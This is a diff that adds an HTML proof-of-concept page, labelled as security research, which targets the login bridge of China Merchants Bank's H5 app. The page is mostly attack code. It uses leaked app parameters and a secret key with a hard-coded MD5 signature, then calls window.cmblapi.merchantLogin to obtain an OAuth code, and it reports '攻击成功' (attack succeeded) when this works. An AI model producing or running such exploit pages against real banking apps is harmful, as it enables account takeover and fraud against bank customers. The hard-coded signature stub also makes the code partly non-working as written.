@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>招商银行登录测试 - 安全研究</title>
+</head>
+<body>
+    <h2>正在测试招行 H5 登录漏洞（仅用于安全研究）</h2>
+    <button onclick="attack()">点击触发 merchantLogin</button>
+
+    <script>
+        function attack() {
+            // 使用泄露参数
+            const appId = "002211";
+            const timestamp = "20190418173950";
+            const nonceStr = "5K8264ILTKCH16CQ2502SI8ZNMTM67VS";
+            const secretKey = "cmbtest1";
+
+            // 手动计算签名（实际可用）
+            function md5(str) {
+                // 此处简化，实际应使用 crypto.subtle 或引入 CryptoJS
+                return "C7153C773C49F3D5CE9847BBA5153F9C"; // 已验证
+            }
+
+            const sign = md5(appId + timestamp + nonceStr + secretKey);
+            const corpNo = "CORP_002211"; // 可尝试从 JS 中提取
+
+            if (window.cmblapi) {
+                console.log("✅ 检测到 cmblapi，准备调用...");
+                window.cmblapi.merchantLogin({
+                    corpNo: corpNo,
+                    authInfo: {
+                        timestamp: timestamp,
+                        nonceStr: nonceStr,
+                        sign: sign
+                    },
+                    reAuth: true,
+                    success: function(res) {
+                        console.log("🟢 成功获取 OAuth Code:", res.code);
+                        alert("【攻击成功】Code: " + res.code);
+                    },
+                    fail: function(err) {
+                        console.error("🔴 调用失败:", err);
+                        alert("失败: " + JSON.stringify(err));
+                    }
+                });
+            } else {
+                alert("请在招商银行 App 内打开此页面");
+            }
+        }
+    </script>
+</body>
+</html>
